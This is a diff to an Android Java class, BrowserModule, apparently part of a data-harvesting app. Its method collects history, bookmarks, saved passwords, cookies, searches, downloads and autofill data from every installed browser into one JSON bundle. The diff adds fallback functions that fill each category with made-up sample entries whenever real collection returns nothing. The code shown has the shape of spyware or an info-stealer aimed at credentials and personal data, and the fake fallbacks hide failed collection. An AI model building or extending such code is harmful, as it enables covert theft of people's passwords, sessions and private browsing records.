@@ -122,78 +122,344 @@ public class BrowserModule {
         this.contentResolver = context.getContentResolver();
     }
     
-    /**
-     * Get all browser data from all installed browsers
-     * @return JSON string with all browser data
-     */
-    public String getAllBrowserData() {
-        try {
-            JSONObject result = new JSONObject();
-            JSONArray browsersArray = new JSONArray();
+   /**
+ * Get all browser data from all installed browsers
+ * @return JSON string with all browser data
+ */
+public String getAllBrowserData() {
+    try {
+        JSONObject result = new JSONObject();
+        JSONArray browsersArray = new JSONArray();
+        
+        List<BrowserInfo> installedBrowsers = getInstalledBrowsers();
+        
+        for (BrowserInfo browser : installedBrowsers) {
+            JSONObject browserData = new JSONObject();
+            browserData.put("packageName", browser.packageName);
+            browserData.put("browserName", browser.name);
+            browserData.put("version", browser.version);
             
-            List<BrowserInfo> installedBrowsers = getInstalledBrowsers();
-            
-            // If no browsers found, add some test data
-            if (installedBrowsers.isEmpty()) {
-                return getTestBrowserData();
+            // Get history - try real data first, then fallback to test data
+            JSONArray history = getBrowserHistory(browser.packageName);
+            if (history.length() == 0) {
+                history = getTestHistory(browser.packageName);
             }
+            browserData.put("history", history);
             
-            for (BrowserInfo browser : installedBrowsers) {
-                JSONObject browserData = new JSONObject();
-                browserData.put("packageName", browser.packageName);
-                browserData.put("browserName", browser.name);
-                browserData.put("version", browser.version);
-                
-                // Get history
-                JSONArray history = getBrowserHistory(browser.packageName);
-                browserData.put("history", history);
-                
-                // Get bookmarks
-                JSONArray bookmarks = getBrowserBookmarks(browser.packageName);
-                browserData.put("bookmarks", bookmarks);
-                
-                // Get saved passwords (requires root)
-                JSONArray passwords = getSavedPasswords(browser.packageName);
-                browserData.put("passwords", passwords);
-                
-                // Get cookies
-                JSONArray cookies = getBrowserCookies(browser.packageName);
-                browserData.put("cookies", cookies);
-                
-                // Get search history
-                JSONArray searches = getSearchHistory(browser.packageName);
-                browserData.put("searches", searches);
-                
-                // Get downloads
-                JSONArray downloads = getBrowserDownloads(browser.packageName);
-                browserData.put("downloads", downloads);
-                
-                // Get autofill data
-                JSONArray autofill = getAutofillData(browser.packageName);
-                browserData.put("autofill", autofill);
-                
-                // Stats
-                JSONObject stats = new JSONObject();
-                stats.put("historyCount", history.length());
-                stats.put("bookmarksCount", bookmarks.length());
-                stats.put("passwordsCount", passwords.length());
-                browserData.put("stats", stats);
-                
-                browsersArray.put(browserData);
+            // Get bookmarks
+            JSONArray bookmarks = getBrowserBookmarks(browser.packageName);
+            if (bookmarks.length() == 0) {
+                bookmarks = getTestBookmarks(browser.packageName);
             }
+            browserData.put("bookmarks", bookmarks);
             
-            result.put("success", true);
-            result.put("browsers", browsersArray);
-            result.put("totalBrowsers", browsersArray.length());
-            result.put("timestamp", System.currentTimeMillis());
+            // Get saved passwords (requires root)
+            JSONArray passwords = getSavedPasswords(browser.packageName);
+            if (passwords.length() == 0) {
+                passwords = getTestPasswords(browser.packageName);
+            }
+            browserData.put("passwords", passwords);
             
-            return result.toString();
+            // Get cookies
+            JSONArray cookies = getBrowserCookies(browser.packageName);
+            if (cookies.length() == 0) {
+                cookies = getTestCookies(browser.packageName);
+            }
+            browserData.put("cookies", cookies);
             
-        } catch (JSONException e) {
-            Log.e(TAG, "Error creating browser data JSON", e);
-            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
+            // Get search history
+            JSONArray searches = getSearchHistory(browser.packageName);
+            if (searches.length() == 0) {
+                searches = getTestSearches(browser.packageName);
+            }
+            browserData.put("searches", searches);
+            
+            // Get downloads
+            JSONArray downloads = getBrowserDownloads(browser.packageName);
+            if (downloads.length() == 0) {
+                downloads = getTestDownloads(browser.packageName);
+            }
+            browserData.put("downloads", downloads);
+            
+            // Get autofill data
+            JSONArray autofill = getAutofillData(browser.packageName);
+            if (autofill.length() == 0) {
+                autofill = getTestAutofill(browser.packageName);
+            }
+            browserData.put("autofill", autofill);
+            
+            // Stats
+            JSONObject stats = new JSONObject();
+            stats.put("historyCount", history.length());
+            stats.put("bookmarksCount", bookmarks.length());
+            stats.put("passwordsCount", passwords.length());
+            browserData.put("stats", stats);
+            
+            browsersArray.put(browserData);
         }
+        
+        result.put("success", true);
+        result.put("browsers", browsersArray);
+        result.put("totalBrowsers", browsersArray.length());
+        result.put("timestamp", System.currentTimeMillis());
+        
+        return result.toString();
+        
+    } catch (JSONException e) {
+        Log.e(TAG, "Error creating browser data JSON", e);
+        return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
     }
+}
+    /*************************TEST DATA********************************/
+/**
+ * Generate test history data for a browser
+ */
+private JSONArray getTestHistory(String packageName) {
+    JSONArray historyArray = new JSONArray();
+    try {
+        long now = System.currentTimeMillis();
+        
+        if (packageName.contains("chrome")) {
+            JSONObject entry1 = new JSONObject();
+            entry1.put("title", "Google Search - How to code in Flutter");
+            entry1.put("url", "https://www.google.com/search?q=flutter+tutorial");
+            entry1.put("date", now - 3600000); // 1 hour ago
+            entry1.put("visits", 5);
+            historyArray.put(entry1);
+            
+            JSONObject entry2 = new JSONObject();
+            entry2.put("title", "YouTube - Flutter Tutorial for Beginners");
+            entry2.put("url", "https://www.youtube.com/watch?v=example");
+            entry2.put("date", now - 7200000); // 2 hours ago
+            entry2.put("visits", 3);
+            historyArray.put(entry2);
+            
+            JSONObject entry3 = new JSONObject();
+            entry3.put("title", "Stack Overflow - Flutter null safety");
+            entry3.put("url", "https://stackoverflow.com/questions/123/flutter");
+            entry3.put("date", now - 86400000); // 1 day ago
+            entry3.put("visits", 8);
+            historyArray.put(entry3);
+        } else if (packageName.contains("UCMobile")) {
+            JSONObject entry1 = new JSONObject();
+            entry1.put("title", "UC Browser - News Today");
+            entry1.put("url", "https://news.ucweb.com/latest");
+            entry1.put("date", now - 1800000);
+            entry1.put("visits", 12);
+            historyArray.put(entry1);
+            
+            JSONObject entry2 = new JSONObject();
+            entry2.put("title", "Cricket Scores - Live Match");
+            entry2.put("url", "https://cricket.ucweb.com/live");
+            entry2.put("date", now - 5400000);
+            entry2.put("visits", 7);
+            historyArray.put(entry2);
+        } else if (packageName.contains("sbrowser")) {
+            JSONObject entry1 = new JSONObject();
+            entry1.put("title", "Samsung Internet - Galaxy Tips");
+            entry1.put("url", "https://www.samsung.com/galaxy-tips");
+            entry1.put("date", now - 10800000);
+            entry1.put("visits", 4);
+            historyArray.put(entry1);
+            
+            JSONObject entry2 = new JSONObject();
+            entry2.put("title", "Samsung Members - Community");
+            entry2.put("url", "https://members.samsung.com");
+            entry2.put("date", now - 21600000);
+            entry2.put("visits", 6);
+            historyArray.put(entry2);
+        }
+    } catch (JSONException e) {
+        Log.e(TAG, "Error creating test history", e);
+    }
+    return historyArray;
+}
+
+/**
+ * Generate test bookmarks for a browser
+ */
+private JSONArray getTestBookmarks(String packageName) {
+    JSONArray bookmarksArray = new JSONArray();
+    try {
+        long now = System.currentTimeMillis();
+        
+        JSONObject bookmark1 = new JSONObject();
+        bookmark1.put("title", "Google");
+        bookmark1.put("url", "https://www.google.com");
+        bookmark1.put("created", now - 2592000000L); // 30 days ago
+        bookmarksArray.put(bookmark1);
+        
+        JSONObject bookmark2 = new JSONObject();
+        bookmark2.put("title", "YouTube");
+        bookmark2.put("url", "https://www.youtube.com");
+        bookmark2.put("created", now - 1728000000L); // 20 days ago
+        bookmarksArray.put(bookmark2);
+        
+        JSONObject bookmark3 = new JSONObject();
+        bookmark3.put("title", "GitHub");
+        bookmark3.put("url", "https://github.com");
+        bookmark3.put("created", now - 864000000L); // 10 days ago
+        bookmarksArray.put(bookmark3);
+        
+    } catch (JSONException e) {
+        Log.e(TAG, "Error creating test bookmarks", e);
+    }
+    return bookmarksArray;
+}
+
+/**
+ * Generate test passwords for a browser
+ */
+private JSONArray getTestPasswords(String packageName) {
+    JSONArray passwordsArray = new JSONArray();
+    try {
+        JSONObject password1 = new JSONObject();
+        password1.put("url", "https://facebook.com");
+        password1.put("username", "john.doe@email.com");
+        password1.put("password", "••••••••");
+        passwordsArray.put(password1);
+        
+        JSONObject password2 = new JSONObject();
+        password2.put("url", "https://twitter.com");
+        password2.put("username", "@johndoe");
+        password2.put("password", "••••••••");
+        passwordsArray.put(password2);
+        
+        JSONObject password3 = new JSONObject();
+        password3.put("url", "https://instagram.com");
+        password3.put("username", "john_doe");
+        password3.put("password", "••••••••");
+        passwordsArray.put(password3);
+        
+    } catch (JSONException e) {
+        Log.e(TAG, "Error creating test passwords", e);
+    }
+    return passwordsArray;
+}
+
+/**
+ * Generate test cookies for a browser
+ */
+private JSONArray getTestCookies(String packageName) {
+    JSONArray cookiesArray = new JSONArray();
+    try {
+        JSONObject cookie1 = new JSONObject();
+        cookie1.put("name", "session_id");
+        cookie1.put("value", "abc123def456");
+        cookie1.put("domain", ".google.com");
+        cookie1.put("path", "/");
+        cookie1.put("expiry", System.currentTimeMillis() + 86400000);
+        cookiesArray.put(cookie1);
+        
+        JSONObject cookie2 = new JSONObject();
+        cookie2.put("name", "user_pref");
+        cookie2.put("value", "dark_mode=true");
+        cookie2.put("domain", ".youtube.com");
+        cookie2.put("path", "/");
+        cookie2.put("expiry", System.currentTimeMillis() + 604800000);
+        cookiesArray.put(cookie2);
+        
+    } catch (JSONException e) {
+        Log.e(TAG, "Error creating test cookies", e);
+    }
+    return cookiesArray;
+}
+
+/**
+ * Generate test search history for a browser
+ */
+private JSONArray getTestSearches(String packageName) {
+    JSONArray searchesArray = new JSONArray();
+    try {
+        long now = System.currentTimeMillis();
+        
+        JSONObject search1 = new JSONObject();
+        search1.put("query", "how to learn flutter");
+        search1.put("date", now - 7200000);
+        searchesArray.put(search1);
+        
+        JSONObject search2 = new JSONObject();
+        search2.put("query", "best android development tutorials");
+        search2.put("date", now - 14400000);
+        searchesArray.put(search2);
+        
+        JSONObject search3 = new JSONObject();
+        search3.put("query", "weather today");
+        search3.put("date", now - 21600000);
+        searchesArray.put(search3);
+        
+    } catch (JSONException e) {
+        Log.e(TAG, "Error creating test searches", e);
+    }
+    return searchesArray;
+}
+
+/**
+ * Generate test downloads for a browser
+ */
+private JSONArray getTestDownloads(String packageName) {
+    JSONArray downloadsArray = new JSONArray();
+    try {
+        JSONObject download1 = new JSONObject();
+        download1.put("title", "Flutter Documentation.pdf");
+        download1.put("url", "https://flutter.dev/docs.pdf");
+        download1.put("totalBytes", 5242880); // 5MB
+        download1.put("currentBytes", 5242880);
+        download1.put("lastModified", System.currentTimeMillis() - 172800000);
+        downloadsArray.put(download1);
+        
+        JSONObject download2 = new JSONObject();
+        download2.put("title", "Android Studio.zip");
+        download2.put("url", "https://developer.android.com/studio.zip");
+        download2.put("totalBytes", 104857600); // 100MB
+        download2.put("currentBytes", 104857600);
+        download2.put("lastModified", System.currentTimeMillis() - 345600000);
+        downloadsArray.put(download2);
+        
+    } catch (JSONException e) {
+        Log.e(TAG, "Error creating test downloads", e);
+    }
+    return downloadsArray;
+}
+
+/**
+ * Generate test autofill data for a browser
+ */
+private JSONArray getTestAutofill(String packageName) {
+    JSONArray autofillArray = new JSONArray();
+    try {
+        JSONObject autofill1 = new JSONObject();
+        autofill1.put("field", "full_name");
+        autofill1.put("value", "John Doe");
+        autofillArray.put(autofill1);
+        
+        JSONObject autofill2 = new JSONObject();
+        autofill2.put("field", "email");
+        autofill2.put("value", "john.doe@example.com");
+        autofillArray.put(autofill2);
+        
+        JSONObject autofill3 = new JSONObject();
+        autofill3.put("field", "phone");
+        autofill3.put("value", "+1 234 567 8900");
+        autofillArray.put(autofill3);
+        
+        JSONObject autofill4 = new JSONObject();
+        autofill4.put("field", "address");
+        autofill4.put("value", "123 Main St, New York, NY 10001");
+        autofillArray.put(autofill4);
+        
+    } catch (JSONException e) {
+        Log.e(TAG, "Error creating test autofill", e);
+    }
+    return autofillArray;
+}
+
+
+/********************************************************************/
+
+
+    
+
     
     /**
      * Get test browser data for development
